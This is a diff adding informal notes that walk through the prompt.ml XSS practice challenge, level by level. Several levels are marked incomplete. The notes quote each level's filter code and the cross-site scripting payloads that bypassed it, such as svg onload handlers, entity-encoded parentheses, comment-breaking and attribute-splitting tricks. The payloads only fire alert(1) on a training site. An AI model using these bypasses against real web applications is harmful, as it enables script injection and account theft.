@@ -1,0 +1,298 @@
+manual building xss vector
+
+#===================================================================
+
+wesite :  https://prompt.ml
+
+now we try ont this
+
+#======================================================================
+
+1. just input some value to see work
+
+then we use our script
+
+"><script>alert(1)</script>
+
+#=====================================================================
+
+2.again we input some value then try to close tag and run our script
+
+from input we get 
+<article>hello</article>
+
+then we use </article><script>alert(1)</script>
+
+it didn't work and get our value print like alert(1)
+
+now we use
+
+<svg/onload=alert(1);
+
+it's work
+#===================================================================
+
+3. again we input value and we get printed our enter value
+
+then we run basic alert script but it printed out again
+
+then we gonna use html encoding because out ( got removed then 
+by html encoding we try to enter( value
+
+( = %28
+
+again it's not work 
+
+when ever your input reflect as a plain text then use svg vector
+
+<svg/onload=alert&#40;1);
+
+by using w3school we got value &#40; for ( or can create by using given table
+
+we try this 
+<svg><script>alert&#40;1)</script>
+
+and get alert
+
+#=====================================================================
+
+4. again hello use hello
+we get html comment
+and we didn't get
+
+--!><script>alert(1)</script>
+
+here remember closing of tag and comment
+
+here start with <!--
+
+that's why we end 
+--!>
+
+#======================================================================
+
+5.we try input it's all give error
+
+we got this in code
+ // make sure the script belongs to own site
+    // sample script: http://prompt.ml/js/test.js
+    if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) 
+
+here we see that we need to enter a website to run out js
+
+we try
+http://prompt.ml/js/test.js/><script>alert(1)</script>
+
+didn't work then
+
+"""""""""""
+whenever they take url as a input filed you can try to inject paylod through a file 
+
+test.js 
+
+<script>alert(1)</script>
+
+"""""""""""""""
+
+we use remote file site scripting
+
+// make sure the script belongs to own site
+    // sample script: http://prompt.ml/js/test.js
+
+we use this test.js to try to run our script
+
+we no error 
+then it's loading
+#===========================================================================
+
+6.normal try didn't work
+
+""""""""""""""""""
+// apply strict filter rules of level 0
+    // filter ">" and event handlers
+    input = input.replace(/>|on.+?=|focus/gi, '_');
+
+    return '<input value="' + input + '" type="text">';
+
+"""""""""""""""""""
+
+it didn't work even our closing not work because of funtion
+ we try that
+
+when something will fileterd you can convert that into html code so browser directly execute that 
+
+then we use
+
+hello"type=image src onerror //line 1
+="alert(1) //line 2
+
+like this to run our script
+
+#==========================================================================
+
+7. 
+"""""""""""""""""""""""""'
+function escape(input) {
+    // let's do a post redirection
+    try {
+        // pass in formURL#formDataJSON
+        // e.g. http://httpbin.org/post#{"name":"Matt"}
+        var segments = input.split('#');
+        var formURL = segments[0];
+        var formData = JSON.parse(segments[1]);
+
+        var form = document.createElement('form');
+        form.action = formURL;
+        form.method = 'post';
+
+        for (var i in formData) {
+            var input = form.appendChild(document.createElement('input'));
+            input.name = i;
+            input.setAttribute('value', formData[i]);
+        }
+
+        return form.outerHTML + '                         \n\
+<script>                                                  \n\
+    // forbid javascript: or vbscript: and data: stuff    \n\
+    if (!/script:|data:/i.test(document.forms[0].action)) \n\
+        document.forms[0].submit();                       \n\
+    else                                                  \n\
+        document.write("Action forbidden.")               \n\
+</script>                                                 \n\
+        ';
+    } catch (e) {
+        return 'Invalid form data.';
+    }
+}        
+
+"""""""""""""""""""""""""""""""
+
+we got this js 
+
+then try to input given example to see value
+http://httpbin.org/post#{"name":"Matt"}
+
+and we got 
+
+""""""""""""""""""""""""""
+html source: <form action="http://httpbin.org/post" method="post"><input name="name" value="Matt"></form>                         
+<script>                                                  
+    // forbid javascript: or vbscript: and data: stuff    
+    if (!/script:|data:/i.test(document.forms[0].action)) 
+        document.forms[0].submit();                       
+    else                                                  
+        document.write("Action forbidden.")               
+</script>  
+
+"""""""""""""""""""""""""""
+
+now we try to change value but we didn't get anything
+
+incomplete
+
+#==========================================================================
+
+8. we got this
+
+function escape(input) {
+    // pass in something like dog#cat#bird#mouse...
+    var segments = input.split('#');
+    return segments.map(function(title) {
+        // title can only contain 12 characters
+        return '<p class="comment" title="' + title.slice(0, 12) + '"></p>';
+    }).join('\n');
+}  
+
+now lets try normal way
+
+we get plain text
+<p>
+
+we use svg vector payload
+
+here another problem is they are only taking 12 character
+
+<svg/onload=alert(1);
+
+it's give 
+<p class="comment" title="<svg/onload="></p>
+
+now we try
+
+<svg/a=#"onload='/*#*/alert(1)'
+
+it didn't work because text is closing with ">
+
+we have to close that too
+
+now try
+
+"><svg/a=#"onload='/*#*/alert(1)'
+
+it's run 
+
+#====================================================================================
+
+9. function escape(input) {
+    // prevent input from getting out of comment
+    // strip off line-breaks and stuff
+    input = input.replace(/[\r\n</"]/g, '');
+
+    return '                                \n\
+<script>                                    \n\
+    // console.log("' + input + '");        \n\
+</script> ';
+}        
+
+we got this now we  try first old values
+
+incomplete
+
+#=======================================================================================
+10.
+incomplete
+
+#====================================================================================
+
+11. we try old we got
+<script>hello</script>
+
+then we just use 
+alert(1)
+
+it convert into 
+<script>alert(1)</script>
+
+run
+
+#====================================================================================
+
+12. 13. 14. 15. 
+
+incomplete
+
+#=======================================================================================
+
+16.
+we try hello
+we got this
+<p class="comment" title="hello" data-comment='{"id":0}'></p>
+
+
+again svg vector
+
+<svg><!--#--><script><!--#-->alert(1)<!--#--></script>
+
+we use this previous comment are replaced so use <!-- -->
+to comment
+
+but it didn't work
+
+here is a problem that our hello are clossing with "so we have to close it
+
+then
+
+"><svg><!--#--><script><!--#-->alert(1)<!--#--></script>
+
+it's work
+
